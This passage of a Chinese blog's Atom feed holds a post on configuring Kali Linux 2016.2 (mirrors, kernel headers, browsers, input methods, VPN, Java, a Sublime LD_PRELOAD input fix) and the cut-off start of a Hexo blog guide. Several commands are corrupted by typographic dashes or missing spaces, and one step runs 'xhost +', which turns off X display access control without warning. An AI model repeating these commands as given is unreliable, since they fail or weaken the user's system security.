    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Kali Linux官方于8月30日发布Kali Linux 2016的第二个版本Kali Linux 2016.2。该版本距离Kali Linux 2016.1版本发布，已经有7个月。在这期间，在Kali Linux 2016.2版本发布的这段时间，Kali Linux官方增补了94个更新。</p><p>主要的更新大概是这个样子：</p><ul><li><p>Kali Linux 2016系统中的音量调整按钮归并到右上角的关闭按钮，点击关闭按钮，就可以看到音量调整滑块按钮。</p></li><li><p>使用Kali Linux 2016系统在VMWare虚拟机时，在安装增强工具open-vm-tools后，复制较大文件，会出现复制进度对话框。该对话框消失后，文件并没有出现在目标位置。这时，再次粘贴一次，就可以了。如果还是没有要复制的文件，用户可以在根目录下的/tmp/VMwareDnD中找到临时文件夹。复制的文件保存在该文件夹中。</p></li><li><p>Kali Linux 2016.2默认浏览器不再是Iceweasel，替换为FireFox ESR。该版本不会像FireFox普通版本频繁更新</p><p><img src="https://www.kali.org/wp-content/uploads/2016/08/gnome-1024x768.png" alt="1"></p><p>​</p></li></ul><p>关于kali使用前的一些配置，网上有很多版本，但是不是老就是很不实用。而且现在kali已经更新到了2016.2版，大多新手肯定都想安装最新版进行尝试，那么接下来我就简记一下我安装和使用过程中，对一些问题的解决。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>具体的安装步骤就不说了，大家都懂得</p><p>可以参考：<a href="http://jingyan.baidu.com/article/93f9803f04e292e0e46f5533.html" target="_blank" rel="noopener">《虚拟机安装kali2.0》</a></p><p>不想装的，官方也提供了ova文件，可以一键导入虚拟机。</p><p>在过去的几个月里，kali官方增加了新的相关工具，修复了固定的各种bug和操作系统的改进。一些Busybox添加了HTTPS支持，现在可以设置安全的支持SSL的kali，更方便快捷的安装kali。</p><h4 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h4><p>kali linux的更新源很重要，一定要选好，rolling的选rolling的源。</p><p>首先：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后复制粘贴下面的源:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">kali官方源</span></span><br><span class="line"></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">中科大的源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br></pre></td></tr></table></figure><p>然后更新并安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure><h4 id="安装内核头（这个很多人都在问怎么办）"><a href="#安装内核头（这个很多人都在问怎么办）" class="headerlink" title="安装内核头（这个很多人都在问怎么办）"></a>安装内核头（这个很多人都在问怎么办）</h4><p>我给出我的解决办法，总之还是升级内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r</span><br><span class="line">$ 4.3.0-kali1-amd64</span><br></pre></td></tr></table></figure><p>如果你使用我给出的源进行更新的话就会升级到4.6.0-kali1-amd64</p><p>这时候使用命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure><p>就可以了。</p><h4 id="安装浏览器"><a href="#安装浏览器" class="headerlink" title="安装浏览器"></a>安装浏览器</h4><h5 id="1-汉化火狐浏览器"><a href="#1-汉化火狐浏览器" class="headerlink" title="1.汉化火狐浏览器"></a>1.汉化火狐浏览器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iceweasel-l10n-zh-cn</span><br></pre></td></tr></table></figure><h5 id="2-安装并使用chrome"><a href="#2-安装并使用chrome" class="headerlink" title="2.安装并使用chrome"></a>2.安装并使用chrome</h5><p>先下载chrome的deb安装包</p><p>执行dpkg -i google-chrome-xxx.deb你会发现报错，不用慌接下来执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt–get install libappindicator1</span><br></pre></td></tr></table></figure><p>可能还会报错，别慌，执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><p>然后安装完成，但是你会发现不能运行，原因是权限问题</p><p>我们添加一个用户:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser zeroyu</span><br></pre></td></tr></table></figure><p>然后一路回车，最后敲Y</p><p>之后按次序执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xhost +</span><br><span class="line">$ su zeroyu</span><br></pre></td></tr></table></figure><p>之后敲入 google-chrome就好了</p><h4 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h4><p>个人喜欢搜狗输入法，所以再次给出搜狗输入法的安装方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">dpkg -i sougoupinyinXXX.deb</span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><p>最后重启电脑就好了。（<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="noopener">搜狗输入法安装包下载</a>）</p><h4 id="安装百度云"><a href="#安装百度云" class="headerlink" title="安装百度云"></a>安装百度云</h4><p>宝宝的好多小秘密还藏在上面必须安装一下</p><p>依次执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/LiuLang/bcloud-packages</span><br><span class="line">apt-get -f install</span><br><span class="line">dpkg -i bcloud-x.x.x.deb</span><br></pre></td></tr></table></figure><h4 id="安装为知笔记"><a href="#安装为知笔记" class="headerlink" title="安装为知笔记"></a>安装为知笔记</h4><p>到<a href="http://ppa.launchpad.net/wiznote-team/ppa/ubuntu/pool/main/w/wiznote/" target="_blank" rel="noopener">wiznote安装包下载地址</a>找到相应的deb安装包</p><p>然后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg –i wiznote_2.3xxxx.deb</span><br></pre></td></tr></table></figure><h4 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip installshadowsocks–gtk</span><br></pre></td></tr></table></figure><p>终端输入shadowsocks-gtk敲回车就可以看到ui界面了。</p><h4 id="解决字体重叠问题"><a href="#解决字体重叠问题" class="headerlink" title="解决字体重叠问题"></a>解决字体重叠问题</h4><p>这里先解决下碰到的坑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt–get install ttf–wqy–microhei ttf–wqy–zenhei xfonts–wqy</span><br></pre></td></tr></table></figure><p>重启终端就好了，这个最好在安装内核头之前完成！</p><h4 id="VPN安装"><a href="#VPN安装" class="headerlink" title="VPN安装"></a>VPN安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure><p>修改最后一行的managed=false改为managed=true</p><p>然后执行下面的命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt–get install network–manager–openvpn–gnome</span><br><span class="line">apt–get install network–manager–pptp</span><br><span class="line">apt–get install network–manager–pptp–gnome</span><br><span class="line">apt–get install network–manager–strongswan</span><br><span class="line">apt–get install network–manager–vpnc</span><br><span class="line">apt–get install network–manager–vpnc–gnome</span><br><span class="line">/etc/init.d/network–manager restart</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install network-manager-gnomemv /etc/network/interfaces /etc/network/interfaces.bak touch /etc/network/interfaces echo “auto lo” &gt; /etc/network/interfaces echo “iface lo inet loopback” &gt;&gt; /etc/network/interfaces service network-manager start</span><br></pre></td></tr></table></figure><h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt–get update</span><br><span class="line">apt–get install docker.io</span><br></pre></td></tr></table></figure><h4 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h4><p><a href="http://redis.io/download" target="_blank" rel="noopener">redis下载</a></p><p>下载完后先编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar xvf redis–x.x.x.tar.gz</span><br><span class="line">cd redis–x.x.x</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>而后安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br><span class="line">cd utils</span><br><span class="line">sudo ./install_server.sh</span><br></pre></td></tr></table></figure><p>接下来一步一步设置就好</p><h4 id="Mac安装后启动问题的解决"><a href="#Mac安装后启动问题的解决" class="headerlink" title="Mac安装后启动问题的解决"></a>Mac安装后启动问题的解决</h4><p>其实安装跟其它都一样，就是安装后启动要等好久（当然你也可以每次启动都按下option进行选择启动）</p><p>解决方法就是</p><p>插入macOS的安装光盘，重新启动，按住option 通过光盘启动 进入安装界面 从菜单选择terminal：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bless –device /dev/disk0 –setBoot –legacy –verbose</span><br></pre></td></tr></table></figure><p>#这里的disk0是安装grub的分区，可以通过diskutil list来进行查看</p><p>最后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>ok，这样单引导安装就完成了。</p><h4 id="网易云音乐正确安装姿势"><a href="#网易云音乐正确安装姿势" class="headerlink" title="网易云音乐正确安装姿势"></a>网易云音乐正确安装姿势</h4><p>下载<a href="http://music.163.com/#/download" target="_blank" rel="noopener">网易云音乐（deepin版）</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg –i 网易云.deb</span><br></pre></td></tr></table></figure><p>注意!之后还要到/usr/share目录下的application目录找到网易云音乐，右键在命令后加一句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">—no–sandbox</span><br></pre></td></tr></table></figure><p>这样就ok了。</p><h4 id="安装sun-java"><a href="#安装sun-java" class="headerlink" title="安装sun java"></a>安装sun java</h4><ol><li><h5 id="下载最新的JAVA-JDK"><a href="#下载最新的JAVA-JDK" class="headerlink" title="下载最新的JAVA JDK"></a>下载最新的JAVA JDK</h5></li></ol><p><a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">jdk-8u91-linux-x64</a></p><ol start="2"><li><h5 id="解压缩文件并移动至-opt"><a href="#解压缩文件并移动至-opt" class="headerlink" title="解压缩文件并移动至/opt"></a>解压缩文件并移动至/opt</h5></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf jdk-8u91-linux-x64.tar.gz</span><br><span class="line">mv jdk1.8.0_91 /opt</span><br><span class="line">cd /opt/jdk1.8.0_91</span><br></pre></td></tr></table></figure><ol start="3"><li><h5 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h5></li></ol><p>1）执行 gedit ~/.bashrc ， 并添加下列内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># install JAVA JDK</span><br><span class="line">export JAVA_HOME=/opt/jdk1.8.0_91</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure><p>2）执行 source ~/.bashrc</p><ol start="4"><li><h5 id="安装并注册"><a href="#安装并注册" class="headerlink" title="安装并注册"></a>安装并注册</h5></li></ol><p>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1</span><br><span class="line">update-alternatives --set java /opt/jdk1.8.0_91/bin/java</span><br><span class="line">update-alternatives --set javac /opt/jdk1.8.0_91/bin/javac</span><br></pre></td></tr></table></figure><p>查看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure><h5 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br><span class="line">#output </span><br><span class="line">java version &quot;1.8.0_91&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_91-b14)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode)</span><br></pre></td></tr></table></figure><h4 id="解决sublime的中文输入问题"><a href="#解决sublime的中文输入问题" class="headerlink" title="解决sublime的中文输入问题"></a>解决sublime的中文输入问题</h4><ol><li>保存下述代码为 <code>sublime-imfix.c</code> 文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">sublime-imfix.c</span><br><span class="line">Use LD_PRELOAD to interpose some function to fix sublime input method support for linux.</span><br><span class="line">By Cjacker Huang</span><br><span class="line"></span><br><span class="line">gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</span><br><span class="line">LD_PRELOAD=./libsublime-imfix.so subl</span><br><span class="line">*/</span><br><span class="line">#include &lt;gtk/gtk.h&gt;</span><br><span class="line">#include &lt;gdk/gdkx.h&gt;</span><br><span class="line">typedef GdkSegment GdkRegionBox;</span><br><span class="line"></span><br><span class="line">struct _GdkRegion</span><br><span class="line">&#123;</span><br><span class="line">  long size;</span><br><span class="line">  long numRects;</span><br><span class="line">  GdkRegionBox *rects;</span><br><span class="line">  GdkRegionBox extents;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">GtkIMContext *local_context;</span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">gdk_region_get_clipbox (const GdkRegion *region,</span><br><span class="line">            GdkRectangle    *rectangle)</span><br><span class="line">&#123;</span><br><span class="line">  g_return_if_fail (region != NULL);</span><br><span class="line">  g_return_if_fail (rectangle != NULL);</span><br><span class="line"></span><br><span class="line">  rectangle-&gt;x = region-&gt;extents.x1;</span><br><span class="line">  rectangle-&gt;y = region-&gt;extents.y1;</span><br><span class="line">  rectangle-&gt;width = region-&gt;extents.x2 - region-&gt;extents.x1;</span><br><span class="line">  rectangle-&gt;height = region-&gt;extents.y2 - region-&gt;extents.y1;</span><br><span class="line">  GdkRectangle rect;</span><br><span class="line">  rect.x = rectangle-&gt;x;</span><br><span class="line">  rect.y = rectangle-&gt;y;</span><br><span class="line">  rect.width = 0;</span><br><span class="line">  rect.height = rectangle-&gt;height;</span><br><span class="line">  //The caret width is 2;</span><br><span class="line">  //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret.</span><br><span class="line">  if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) &#123;</span><br><span class="line">        gtk_im_context_set_cursor_location(local_context, rectangle);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//this is needed, for example, if you input something in file dialog and return back the edit area</span><br><span class="line">//context will lost, so here we set it again.</span><br><span class="line"></span><br><span class="line">static GdkFilterReturn event_filter (GdkXEvent *xevent, GdkEvent *event, gpointer im_context)</span><br><span class="line">&#123;</span><br><span class="line">    XEvent *xev = (XEvent *)xevent;</span><br><span class="line">    if(xev-&gt;type == KeyRelease &amp;&amp; GTK_IS_IM_CONTEXT(im_context)) &#123;</span><br><span class="line">       GdkWindow * win = g_object_get_data(G_OBJECT(im_context),&quot;window&quot;);</span><br><span class="line">       if(GDK_IS_WINDOW(win))</span><br><span class="line">         gtk_im_context_set_client_window(im_context, win);</span><br><span class="line">    &#125;</span><br><span class="line">    return GDK_FILTER_CONTINUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void gtk_im_context_set_client_window (GtkIMContext *context,</span><br><span class="line">          GdkWindow    *window)</span><br><span class="line">&#123;</span><br><span class="line">  GtkIMContextClass *klass;</span><br><span class="line">  g_return_if_fail (GTK_IS_IM_CONTEXT (context));</span><br><span class="line">  klass = GTK_IM_CONTEXT_GET_CLASS (context);</span><br><span class="line">  if (klass-&gt;set_client_window)</span><br><span class="line">    klass-&gt;set_client_window (context, window);</span><br><span class="line"></span><br><span class="line">  if(!GDK_IS_WINDOW (window))</span><br><span class="line">    return;</span><br><span class="line">  g_object_set_data(G_OBJECT(context),&quot;window&quot;,window);</span><br><span class="line">  int width = gdk_window_get_width(window);</span><br><span class="line">  int height = gdk_window_get_height(window);</span><br><span class="line">  if(width != 0 &amp;&amp; height !=0) &#123;</span><br><span class="line">    gtk_im_context_focus_in(context);</span><br><span class="line">    local_context = context;</span><br><span class="line">  &#125;</span><br><span class="line">  gdk_window_add_filter (window, event_filter, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>安装 C/C++ 的编译环境和 gtk libgtk2.0-dev</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br><span class="line">sudo apt-get install libgtk2.0-dev</span><br></pre></td></tr></table></figure><ol start="3"><li>编译共享内库</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</span><br></pre></td></tr></table></figure><ol start="4"><li>设置 LD_PRELOAD 并启动 Sublime Text</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libsublime-imfix.so subl</span><br></pre></td></tr></table></figure><ol start="5"><li>修改 <code>/usr/share/applications/sublime_text.desktop</code> 为</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">[...]</span><br><span class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text %F</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[Desktop Action Window]</span><br><span class="line">[...]</span><br><span class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text -n</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">[Desktop Action Document]</span><br><span class="line">[...]</span><br><span class="line">Exec=env LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so /opt/sublime_text/sublime_text --command new_file</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>不要忘了把 <code>libsublime-imfix.so</code> 放到 <code>/opt/sublime_text/</code> 中</p><ol start="6"><li>修改 <code>/usr/bin/subl</code> 为:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">export LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so</span><br><span class="line">exec /opt/sublime_text/sublime_text “$@”</span><br></pre></td></tr></table></figure><p>重启电脑，可以看到Sublime能够输入中文了。</p><h4 id="没有声音"><a href="#没有声音" class="headerlink" title="没有声音???"></a>没有声音???</h4><p>其实并不是不支持声卡驱动了。<br>只是root用户下默认关闭。<br>虽然在setting的sounds里没能看到识别的声卡信息。可是其实驱动是装好的。<br>用<code>pulseaudio –start</code>，就有了。</p><p>输入以下一行，就不用每次启动都要输入那行代码了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl –user enable pulseaudio</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;Kali Linux官方于8月30日发布Kali Linux 2016的第二个版本Kali Linux 2016.2。该版本距离Kali L
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hexo 3.x 博客搭建指南(NEXT主题)</title>
    <link href="http://zer0yu.github.io/2017/01/21/Hexo-3-x-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97-NEXT%E4%B8%BB%E9%A2%98/"/>
    <id>http://zer0yu.github.io/2017/01/21/Hexo-3-x-博客搭建指南-NEXT主题/</id>
    <published>2017-01-21T13:43:00.000Z</published>
    <updated>2017-01-22T10:44:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Pages 本用于介绍托管在 GitHub 的项目，也可以用来搭建博客，有300M免费空间。</p><p>hexo是一个基于Node.js的静态博客程序，可以方便的生成静态网页托管在github和Heroku上。作者是来自台湾的<a href="https://github.com/hexojs/hexo" target="_blank" rel="noopener">tommy351</a>。<br>优势：</p><blockquote><p>生成静态页面快<br>支持 Markdown<br>兼容于 Windows, Mac &amp; Linux<br>部署方便。日常使用仅需五个命令。<br>高扩展性、自订性，文件少、小，易理解</p></blockquote><h4 id="配置SSH"><a href="#配置SSH" class="headerlink" title="配置SSH"></a>配置SSH</h4><p>使用hexo博客必须配置SSH。</p><p>打开git bash，输入<code>cd ~/.ssh</code>，如果果提示：No such file or directory 说明未配置SSH。</p><ul><li><strong>本地生成密钥对</strong><br><code>ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</code>，注意命令中的大小写不要搞混。按提示指定保存文件夹，不设置密码。</li><li><strong>添加公钥到Github</strong></li></ul><ol><li>根据上一步的提示，找到公钥文件（默认为id_rsa.pub），用记事本打开，全选并复制。</li><li>登录Github，右上角 头像 -&gt; <code>Settings</code> —&gt; <code>SSH keys</code> —&gt; <code>Add SSH</code> key。把公钥粘贴到key中，填好title并点击 Add key。</li><li>git bash中输入命令<code>ssh -T git@github.com</code>，选yes，等待片刻可看到成功提示。</li></ol><ul><li><strong>修改本地的ssh remote url，不用https协议，改用git协议</strong></li></ul><ol><li>Github仓库中获取ssh协议相应的url</li><li>本地仓库执行命令<code>git remote set-url origin SSH对应的url</code>，配置完后可用<code>git remote -v</code>查看结果</li></ol><p>这样<code>git push</code>或<code>hexo d</code>时不再需要输入账号密码。</p><h4 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h4><p>注，以下命令行需要在Git终端中执行(右键单击 -&gt; <code>Git bash</code>)。</p><ul><li>安装<a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a>：下载安装后，注册Github账号并配置Git和SSH公私钥</li><li>安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a></li><li>安装hexo：<code>npm install -g hexo</code>，可用<code>hexo -v</code>查看版本。这里我用的是<strong>3.1.1</strong>。也可以指定版本：<code>npm install hexo@3.1.1 -g</code></li><li>创建hexo文件夹：新建放置博客的文件夹，进入并执行命令<code>hexo init</code>。hexo 会在目标文件夹建立网站所需要的所有文件。</li><li>安装依赖包：<code>npm install</code></li><li>创建Github Repository：Repository名字必须是<code>你的Github名.github.io</code>，比如我是<code>loveNight.github.io</code></li><li>部署：打开博客根目录下的<code>_config.yml</code>文件，末尾添加如下信息。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: 上一步的Github仓库地址，项目主页点SSH再复制URL</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate <span class="comment"># 生成静态页面，可以简化为hexo g</span></span><br><span class="line">hexo deploy <span class="comment"># 